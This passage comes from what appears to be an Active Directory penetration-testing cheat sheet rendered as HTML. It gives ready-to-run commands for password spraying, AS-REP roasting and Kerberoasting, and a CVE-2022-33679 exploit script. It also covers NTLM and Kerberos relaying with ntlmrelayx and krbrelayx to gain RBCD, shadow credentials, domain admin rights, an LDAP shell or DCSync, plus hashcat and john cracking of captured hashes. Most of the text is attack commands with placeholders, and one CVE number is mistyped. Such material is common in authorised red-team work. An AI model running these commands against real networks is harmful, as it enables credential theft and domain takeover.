user=pass</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--Password_Spray--⚠️_usual_passwords_1271.html"></a><h1 class='title level-4'>⚠️ usual passwords</h1><br/><p># Valid user (no password)</p><p>## Password Spray</p><p>### ⚠️ usuals passwords  (SeasonYear!, Company123, ...) &gt;&gt;&gt; Clear text Credentials [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &lt;users.txt&gt; -p &lt;password&gt; --continue-on-success</p><p></p><p>sprayhound -U &lt;users.txt&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc  &lt;dc_ip&gt;</p><p></p><p>kerbrute passwordspray -d &lt;domain&gt; &lt;users.txt&gt; &lt;password&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--ASREPRoast_1006.html"></a><h1 class='title level-3'>ASREPRoast</h1><br/><p># Valid user (no password)</p><p>## ASREPRoast<ul><li>List ASREPRoastable Users (need creds)</li></ul></p><p>  - `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u`<ul><li>ASREP roasting &gt;&gt;&gt; Hash found ASREP</li></ul></p><p>  - `GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;users.txt&gt; -format hashcat -outputfile &lt;output.txt&gt;`</p><p>  - `nxc ldap &lt;dc_ip&gt; -u &lt;users.txt&gt;  -p &#39;&#39; --asreproast &lt;output.txt&gt;`</p><p>  - `Rubeus.exe asreproast /format:hashcat`<ul><li>Blind Kerberoasting &gt;&gt;&gt; Hash found TGS</li></ul></p><p>  - `Rubeus.exe keberoast /domain:&lt;domain&gt; /dc:&lt;dcip&gt; /nopreauth: &lt;asrep_user&gt; /spns:&lt;users.txt&gt;`</p><p>  - `GetUserSPNs.py -no-preauth &quot;&lt;asrep_user&gt;&quot; -usersfile &quot;&lt;user_list.txt&gt;&quot; -dc-host &quot;&lt;dc_ip&gt;&quot; &quot;&lt;domain&gt;&quot;/`<ul><li>CVE-2022-33679 @CVE@ &gt;&gt;&gt; Lat move PTT </li></ul></p><p>  - `CVE-2022-33679.py &lt;domain&gt;/&lt;user&gt; &lt;target&gt;`</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--ASREPRoast--List_ASREPRoastable_Users_(need_creds)_1131.html"></a><h1 class='title level-4'>List ASREPRoastable Users (need creds)</h1><br/><p># Valid user (no password)</p><p>## ASREPRoast</p><p>### List ASREPRoastable Users (need creds)</p><p></p><p>MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--ASREPRoast--ASREP_roasting__Hash_found_ASREP_1132.html"></a><h1 class='title level-4'>ASREP roasting >>> Hash found ASREP</h1><br/><p># Valid user (no password)</p><p>## ASREPRoast</p><p>### ASREP roasting &gt;&gt;&gt; Hash found ASREP [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;users.txt&gt; -format hashcat -outputfile &lt;output.txt&gt;</p><p></p><p>nxc ldap &lt;dc_ip&gt; -u &lt;users.txt&gt;  -p &#39;&#39; --asreproast &lt;output.txt&gt;</p><p></p><p>Rubeus.exe asreproast /format:hashcat</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--ASREPRoast--Blind_Kerberoasting__Hash_found_TGS_1133.html"></a><h1 class='title level-4'>Blind Kerberoasting >>> Hash found TGS</h1><br/><p># Valid user (no password)</p><p>## ASREPRoast</p><p>### Blind Kerberoasting &gt;&gt;&gt; Hash found TGS  [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>Rubeus.exe keberoast /domain:&lt;domain&gt; /dc:&lt;dcip&gt; /nopreauth: &lt;asrep_user&gt; /spns:&lt;users.txt&gt;</p><p></p><p>GetUserSPNs.py -no-preauth &quot;&lt;asrep_user&gt;&quot; -usersfile &quot;&lt;user_list.txt&gt;&quot; -dc-host &quot;&lt;dc_ip&gt;&quot; &quot;&lt;domain&gt;&quot;/</p></div><div class='page'><a name="Domain_Dominance--Valid_User_(no_password)--ASREPRoast--CVE-2022-33679_@CVE@__Lat_move_PTT_1134.html"></a><h1 class='title level-4'>CVE-2022-33679 @CVE@ >>> Lat move PTT</h1><br/><p># Valid user (no password)</p><p>## ASREPRoast</p><p>### CVE-2022-33679 @CVE@ &gt;&gt;&gt; Lat move PTT [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p> </p><p>CVE-2022-33679.py &lt;domain&gt;/&lt;user&gt; &lt;target&gt;</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)_969.html"></a><h1 class='title level-2'>Man-in-the-Middle (MitM)</h1><br/><p><ul><li>Responder / smbclient.py</li></ul></p><p> • <strong>Intent:</strong> Listen for LLMNR/NTLM leaks.</p><p> • <strong>Purpose:</strong> Capture NTLM hashes, usernames, creds.</p><p><ul><li>NTLM relay (MS08-068, SMB→LDAP, HTTP→LDAP)</li></ul></p><p> • <strong>Intent:</strong> Relay captured NTLM to privileged services.</p><p> • <strong>Purpose:</strong> Escalate to RBCD, shadow creds, DA.</p><p><ul><li><code>ntlmrelayx.py … --add-computer … --delegate-access</code></li></ul></p><p> • <strong>Intent:</strong> Abuse relay to add machine account + delegation.</p><p> • <strong>Purpose:</strong> RBCD → impersonate admin.</p><p><ul><li><code>ntlmrelayx.py … --shadow-credentials</code></li></ul></p><p> • <strong>Intent:</strong> Add rogue keyCredentialLink.</p><p> • <strong>Purpose:</strong> Shadow creds → persistence/lateral.</p><p><ul><li><code>ntlmrelayx.py … --escalate-user</code></li></ul></p><p> • <strong>Intent:</strong> Modify ACL to escalate.</p><p> • <strong>Purpose:</strong> DA privileges.</p><p><ul><li><code>ntlmrelayx.py … --interactive</code></li></ul></p><p> • <strong>Intent:</strong> Open LDAP shell.</p><p> • <strong>Purpose:</strong> Direct DC modification.</p><p><ul><li>Relay to SMB (<code>--gen-relay-list</code>, socks)</li></ul></p><p> • <strong>Intent:</strong> Identify unsigned SMB, pivot.</p><p> • <strong>Purpose:</strong> Proxy and exploit.</p><p><ul><li>Relay to HTTP → ADCS/WSUS</li></ul></p><p> • <strong>Intent:</strong> Abuse enrollment or update channels.</p><p> • <strong>Purpose:</strong> Escalate via certs or WSUS takeover.</p><p><ul><li>Relay to MSSQL</li></ul></p><p> • <strong>Intent:</strong> Use relay for DB access.</p><p> • <strong>Purpose:</strong> Execute queries as system.</p><p><ul><li>SMB→NETLOGON (ZeroLogon safe)</li></ul></p><p> • <strong>Intent:</strong> Relay DC auth to another DC.</p><p> • <strong>Purpose:</strong> DCSync.</p><p><ul><li>Kerberos relay (<code>krbrelayx</code>)</li></ul></p><p> • <strong>Intent:</strong> Relay Kerberos auth to ADCS or SMB/LDAP.</p><p> • <strong>Purpose:</strong> Issue certs or lateral moves.</p><p></p><p></p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--Listen_1007.html"></a><h1 class='title level-3'>Listen</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## Listen &gt;&gt;&gt; Hash NTLMv1 or NTLMv2 [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>] || Credentials (ldap/http) [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>responder -l &lt;interface&gt; #use --lm to force downgrade</p><p></p><p>smbclient.py</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay_1008.html"></a><h1 class='title level-3'>NTLM relay</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay<ul><li>MS08-068 self relay @CVE@</li></ul></p><p>  - `msf&gt; exploit/windows/smb_smb_relay # windows 2000 / windows server 2008`</p><p><ul><li>SMB -&gt; LDAP(S)</li></ul></p><p>  - NTLMv1</p><p>    - remove mic (no CVE needed)  &gt;&gt;&gt; see LDAP(S)</p><p>  - NTLMv2</p><p>    - Remove mic (CVE-2019-1040) @CVE@ &gt;&gt;&gt; see LDAP(S)</p><p><ul><li>HTTP(S) -&gt; LDAP(S)</li></ul></p><p>  - Usually from webdav coerce &gt;&gt;&gt; see LDAP(S)</p><p><ul><li>To LDAP(S)</li></ul></p><p>  - Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</p><p>    - `ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --add-computer &lt;computer_name&gt; &lt;computer_password&gt; --delegate-access ` &gt;&gt;&gt; RBCD</p><p>    - `ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --shadow-credentials --shadow-target &#39;&lt;dc_name$&gt;&#39;` &gt;&gt;&gt; Shadow Credentials</p><p>    - `ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --escalate-user &lt;user&gt;` &gt;&gt;&gt; Domain admin</p><p>    - `ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111` &gt;&gt;&gt; LDAP SHELL</p><p><ul><li>To SMB</li></ul></p><p>  - Relay to SMB (if SMB is not signed)</p><p>    - Find SMB not signed targets (default if not a Domain controler)<ul><li>`nxc smb &lt;ip_range&gt; --gen-relay-list smb_unsigned_ips.txt`</li></ul></p><p>    - `ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` &gt;&gt;&gt; SMB Socks</p><p><ul><li>To HTTP </li></ul></p><p>  - Relay to CA web enrollement &gt;&gt;&gt; ESC8</p><p>  - Relay to WSUS &gt;&gt;&gt; WSUS</p><p><ul><li>To MsSQL</li></ul></p><p>  - `ntlmrelayx.py -t mssql://&lt;ip&gt; [-smb2support] -socks` &gt;&gt;&gt; MSSQL Socks</p><p><ul><li>SMB -&gt; NETLOGON</li></ul></p><p>  - Zero-Logon (safe method) (CVE-202-1472) @CVE@</p><p>    - Relay one dc to another<ul><li>`ntlmrelayx.py -t dcsync://&lt;dc_to_ip&gt; -smb2support -auth-smb &lt;user&gt;:&lt;password&gt;` &gt;&gt;&gt; DCSYNC</li></ul></p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--MS08-068_self_relay_@CVE@_1135.html"></a><h1 class='title level-4'>MS08-068 self relay @CVE@</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### MS08-068 self relay @CVE@</p><p> </p><p> msf&gt; exploit/windows/smb_smb_relay # windows 2000 / windows server 2008</p><p></p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--SMB_-_LDAP(S)_1136.html"></a><h1 class='title level-4'>SMB -> LDAP(S)</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### SMB -&gt; LDAP(S)</p><p>  - NTLMv1</p><p>    - remove mic (no CVE needed)  &gt;&gt;&gt; see LDAP(S) [<a href="#ce--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)--Relay_to_LDAP_if_LDAP_signing_and_LDAPS_channel_binding_not_enforced_(default)_1145.html">Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</a>]</p><p>  - NTLMv2</p><p>    - Remove mic (CVE-2019-1040) @CVE@ &gt;&gt;&gt; see LDAP(S) [<a href="#ce--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)--Relay_to_LDAP_if_LDAP_signing_and_LDAPS_channel_binding_not_enforced_(default)_1145.html">Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--SMB_-_LDAP(S)--NTLMv1_1143.html"></a><h1 class='title level-5'>NTLMv1</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### SMB -&gt; LDAP(S)</p><p>#### NTLMv1</p><p></p><p>Remove mic (no CVE needed)  &gt;&gt;&gt; see LDAP(S) [<a href="#ce--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)--Relay_to_LDAP_if_LDAP_signing_and_LDAPS_channel_binding_not_enforced_(default)_1145.html">Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--SMB_-_LDAP(S)--NTLMv2_1144.html"></a><h1 class='title level-5'>NTLMv2</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### SMB -&gt; LDAP(S)</p><p>#### NTLMv2</p><p></p><p>Remove mic (CVE-2019-1040) @CVE@ &gt;&gt;&gt; see LDAP(S) [<a href="#ce--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)--Relay_to_LDAP_if_LDAP_signing_and_LDAPS_channel_binding_not_enforced_(default)_1145.html">Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--HTTP(S)_-_LDAP(S)_1137.html"></a><h1 class='title level-4'>HTTP(S) -> LDAP(S)</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### HTTP(S) -&gt; LDAP(S)</p><p></p><p>Usually from webdav coerce &gt;&gt;&gt; see LDAP(S) [<a href="#ce--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)--Relay_to_LDAP_if_LDAP_signing_and_LDAPS_channel_binding_not_enforced_(default)_1145.html">Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)_1138.html"></a><h1 class='title level-4'>To LDAP(S)</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### To LDAP(S)</p><p>#### Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --add-computer &lt;computer_name&gt; &lt;computer_password&gt; --delegate-access  &gt;&gt;&gt; RBCD [<a href="#Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html">Resource-Based Constrained Delegation</a>]</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --shadow-credentials --shadow-target &#39;&lt;dc_name$&gt;&#39; &gt;&gt;&gt; Shadow Credentials [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --escalate-user &lt;user&gt; &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111 &gt;&gt;&gt; LDAP SHELL [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="ce--Man-in-the-Middle_(MitM)--NTLM_relay--To_LDAP(S)--Relay_to_LDAP_if_LDAP_signing_and_LDAPS_channel_binding_not_enforced_(default)_1145.html"></a><h1 class='title level-5'>Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### To LDAP(S)</p><p>#### Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --add-computer &lt;computer_name&gt; &lt;computer_password&gt; --delegate-access  &gt;&gt;&gt; RBCD [<a href="#Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html">Resource-Based Constrained Delegation</a>]</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --shadow-credentials --shadow-target &#39;&lt;dc_name$&gt;&#39; &gt;&gt;&gt; Shadow Credentials [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --escalate-user &lt;user&gt; &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p></p><p>ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111 &gt;&gt;&gt; LDAP SHELL [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--To_SMB_1139.html"></a><h1 class='title level-4'>To SMB</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### To SMB</p><p>  - Relay to SMB (if SMB is not signed)</p><p>    - Find SMB not signed targets (default if not a Domain controler)<ul><li>`nxc smb &lt;ip_range&gt; --gen-relay-list smb_unsigned_ips.txt`</li></ul></p><p>    - `ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` &gt;&gt;&gt; SMB Socks [<a href="#Domain_Dominance--Lateral_Movement--Socks_(relay)_1090.html">Socks (relay)</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--To_SMB--Relay_to_SMB_(if_SMB_is_not_signed)_1146.html"></a><h1 class='title level-5'>Relay to SMB (if SMB is not signed)</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### To SMB</p><p>#### Relay to SMB (if SMB is not signed)</p><p></p><p>Find SMB not signed targets (default if not a Domain controler)</p><p>&gt;&gt;	nxc smb &lt;ip_range&gt; --gen-relay-list smb_unsigned_ips.txt</p><p></p><p>ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks &gt;&gt;&gt; SMB Socks [<a href="#Domain_Dominance--Lateral_Movement--Socks_(relay)_1090.html">Socks (relay)</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--To_HTTP_1140.html"></a><h1 class='title level-4'>To HTTP</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### To HTTP </p><p></p><p>Relay to CA web enrollement &gt;&gt;&gt; ESC8 [<a href="#Domain_Dominance--ADCS--Web_Enrollment_Is_Up--ESC8_1201.html">ESC8</a>]</p><p></p><p>Relay to WSUS &gt;&gt;&gt; WSUS [<a href="#Domain_Dominance--SCCM_977.html">SCCM</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--To_MsSQL_1141.html"></a><h1 class='title level-4'>To MsSQL</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### To MsSQL</p><p></p><p>ntlmrelayx.py -t mssql://&lt;ip&gt; [-smb2support] -socks &gt;&gt;&gt; MSSQL Socks [<a href="#Domain_Dominance--Lateral_Movement--Socks_(relay)_1090.html">Socks (relay)</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay--SMB_-_NETLOGON_1142.html"></a><h1 class='title level-4'>SMB -> NETLOGON</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## NTLM relay</p><p>### SMB -&gt; NETLOGON</p><p>#### Zero-Logon (safe method) (CVE-202-1472) @CVE@</p><p>##### Relay one dc to another</p><p></p><p>ntlmrelayx.py -t dcsync://&lt;dc_to_ip&gt; -smb2support -auth-smb &lt;user&gt;:&lt;password&gt; &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--Kerberos_relay_1009.html"></a><h1 class='title level-3'>Kerberos relay</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## Kerberos relay<ul><li>To HTTP</li></ul></p><p>  - `krbrelayx.py -t &#39;<a href="http://">http://</a>&lt;pki&gt;/certsrv/certfnsh.asp&#39; --adcs --template DomainController -v &#39;&lt;target_netbios&gt;$&#39; -ip &lt;attacker_ip&gt;` &gt;&gt;&gt; ESC8 [<a href="#Domain_Dominance--ADCS--Web_Enrollment_Is_Up--ESC8_1201.html">ESC8</a>]<ul><li>SMB -&gt; SMB</li></ul></p><p>  - same as NTLM relay, use krbrelayx.py [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay_1008.html">NTLM relay</a>]<ul><li>SMB -&gt; LDAP(S)</li></ul></p><p>  - same as NTLM relay, use krbrelayx.py [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay_1008.html">NTLM relay</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--Kerberos_relay--To_HTTP_1148.html"></a><h1 class='title level-4'>To HTTP</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## Kerberos relay</p><p>### To HTTP</p><p></p><p>krbrelayx.py -t &#39;<a href="http://">http://</a>&lt;pki&gt;/certsrv/certfnsh.asp&#39; --adcs --template DomainController -v &#39;&lt;target_netbios&gt;$&#39; -ip &lt;attacker_ip&gt; &gt;&gt;&gt; ESC8 [<a href="#Domain_Dominance--ADCS--Web_Enrollment_Is_Up--ESC8_1201.html">ESC8</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--Kerberos_relay--SMB_-_SMB_1149.html"></a><h1 class='title level-4'>SMB -> SMB</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## Kerberos relay</p><p>### SMB -&gt; SMB</p><p></p><p>same as NTLM relay, use krbrelayx.py [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay_1008.html">NTLM relay</a>]</p></div><div class='page'><a name="Domain_Dominance--Man-in-the-Middle_(MitM)--Kerberos_relay--SMB_-_LDAP(S)_1150.html"></a><h1 class='title level-4'>SMB -> LDAP(S)</h1><br/><p># Man In The Middle (Listen and Relay)</p><p>## Kerberos relay</p><p>### SMB -&gt; LDAP(S)</p><p></p><p>same as NTLM relay, use krbrelayx.py [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)--NTLM_relay_1008.html">NTLM relay</a>]</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes_970.html"></a><h1 class='title level-2'>Crack Hashes</h1><br/><p><ul><li><code>john/hashcat</code> with LM/NT</li></ul></p><p> • <strong>Intent:</strong> Crack legacy Windows hashes.</p><p> • <strong>Purpose:</strong> Recover weak passwords.</p><p><ul><li>NTLMv1/NTLMv2 cracking</li></ul></p><p> • <strong>Intent:</strong> Crack challenge-response captures.</p><p> • <strong>Purpose:</strong> Derive plaintext creds.</p><p><ul><li>Kerberos TGS/ASREP cracking</li></ul></p><p> • <strong>Intent:</strong> Offline crack Kerberos tickets.</p><p> • <strong>Purpose:</strong> Recover service account creds.</p><p><ul><li>MSCache2 cracking</li></ul></p><p> • <strong>Intent:</strong> Crack cached domain creds.</p><p> • <strong>Purpose:</strong> Extract offline domain passwords.</p><p><ul><li>Timeroast (<code>sntp-ms</code>)</li></ul></p><p> • <strong>Intent:</strong> Crack hashes from NTP service.</p><p> • <strong>Purpose:</strong> Derive account keys.</p><p><ul><li>PXE hash cracking</li></ul></p><p> • <strong>Intent:</strong> Crack PXE boot key.</p><p> • <strong>Purpose:</strong> Pivot into SCCM infra.</p><p></p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--LM_(299bd128c1101fd6)_1010.html"></a><h1 class='title level-3'>LM (299bd128c1101fd6)</h1><br/><p># Crack hash</p><p>## LM (299bd128c1101fd6)</p><p></p><p>john --format=lm hash.txt --wordlist=&lt;rockyou.txt&gt;</p><p></p><p>hashcat -m 3000 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--NT_(b4b9b02e6f09a9bd760...)_1011.html"></a><h1 class='title level-3'>NT (b4b9b02e6f09a9bd760...)</h1><br/><p># Crack hash</p><p>## NT (b4b9b02e6f09a9bd760...)</p><p></p><p>john --format=nt hash.txt --wordlist=&lt;rockyou.txt&gt;</p><p></p><p>hashcat -m 1000 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--NTLMv1_(user85D5BC...)_1012.html"></a><h1 class='title level-3'>NTLMv1 (user::85D5BC...)</h1><br/><p># Crack hash</p><p>## NTLMv1 (user::85D5BC...)</p><p></p><p>john --format=netntlm hash.txt --wordlist=&lt;rockyou.txt&gt;</p><p></p><p>hashcat -m 1000 -a 0 hash.txt &lt;rockyou.txt&gt;</p><p></p><p>crack.sh</p><p>[<a href="https://crack.sh/">https://crack.sh/</a>]</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--NTLMv2_(userN46iSNek...)_1013.html"></a><h1 class='title level-3'>NTLMv2 (user::N46iSNek...)</h1><br/><p># Crack hash</p><p>## NTLMv2 (user::N46iSNek...)</p><p></p><p>john --format=netntlmv2 hash.txt --wordlist=&lt;rockyou.txt&gt;</p><p></p><p>hashcat -m 5600 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--Kerberos_5_TGS_($krb5tgs$23$...)_1014.html"></a><h1 class='title level-3'>Kerberos 5 TGS ($krb5tgs$23$...)</h1><br/><p># Crack hash</p><p>## Kerberos 5 TGS ($krb5tgs$23$...)</p><p></p><p>john --format=krb5tgs hash.txt --wordlist=&lt;rockyou.txt&gt;</p><p></p><p>hashcat -m 13100 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--Kerberos_5_TGS_AES128_($krb5tgs$17...)_1015.html"></a><h1 class='title level-3'>Kerberos 5 TGS AES128 ($krb5tgs$17...)</h1><br/><p># Crack hash</p><p>## Kerberos 5 TGS AES128 ($krb5tgs$17...)</p><p></p><p>hashcat -m 19600 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--Kerberos_ASREP_($krb5asrep$23...)_1016.html"></a><h1 class='title level-3'>Kerberos ASREP ($krb5asrep$23...)</h1><br/><p># Crack hash</p><p>## Kerberos ASREP ($krb5asrep$23...)</p><p></p><p>hashcat -m 18200 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--MSCache_2_(very_slow)_($DCC2$10240...)_1017.html"></a><h1 class='title level-3'>MSCache 2 (very slow) ($DCC2$10240...)</h1><br/><p># Crack hash</p><p>## MSCache 2 (very slow) ($DCC2$10240...)</p><p></p><p>hashcat -m 2100 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--Timeroast_hash_($sntp-ms$...)_1018.html"></a><h1 class='title level-3'>Timeroast hash ($sntp-ms$...)</h1><br/><p># Crack hash</p><p>## Timeroast hash ($sntp-ms$...)</p><p></p><p>hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l</p></div><div class='page'><a name="Domain_Dominance--Crack_Hashes--pxe_hash_($sccm$aes128$...)_1019.html"></a><h1 class='title level-3'>pxe hash ($sccm$aes128$...)</h1><br/><p># Crack hash</p><p>## pxe hash ($sccm$aes128$...)</p><p></p><p>hashcat -m 19850 -a 0 hash.txt &lt;rockyou.txt&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html"></a><h1 class='title level-2'>Valid Credentials (cleartext, NT hash, Kerberos ticket)</h1><br/><p><ul><li><code>GetADUsers.py</code>, <code>nxc smb --users</code></li></ul></p><p> • <strong>Intent:</strong> Enumerate domain users.</p><p> • <strong>Purpose:</strong> Expand user list for spraying or cracking.</p><p><ul><li>SMB shares (<code>spider_plus</code>, <code>--shares</code>, <code>manspider</code>)</li></ul></p><p> • <strong>Intent:</strong> Enumerate and loot file shares.</p><p> • <strong>Purpose:</strong> Discover sensitive data or creds.</p><p><ul><li>BloodHound (<code>bloodhound-python</code>, <code>rusthound</code>, <code>sharphound</code>)</li></ul></p><p> • <strong>Intent:</strong> Graph AD rights/relations.</p><p> • <strong>Purpose:</strong> Find attack paths (ACL, delegation).</p><p><ul><li><code>ldeep</code>, <code>ldapdomaindump</code>, <code>ldapsearch-ad</code></li></ul></p><p> • <strong>Intent:</strong> Dump LDAP objects.</p><p> • <strong>Purpose:</strong> Recon accounts, ACLs, delegation.</p><p><ul><li><code>adidnsdump</code></li></ul></p><p> • <strong>Intent:</strong> Enumerate AD DNS zones.</p><p> • <strong>Purpose:</strong> Identify new targets.</p><p><ul><li><code>certify find</code>, <code>certipy find</code></li></ul></p><p> • <strong>Intent:</strong> ADCS enumeration.</p><p> • <strong>Purpose:</strong> Spot vulnerable templates/CA.</p><p><ul><li><code>sccmhunter.py find</code>, <code>SharpSCCM site-info</code></li></ul></p><p> • <strong>Intent:</strong> Enumerate SCCM infra.</p><p> • <strong>Purpose:</strong> Identify takeover 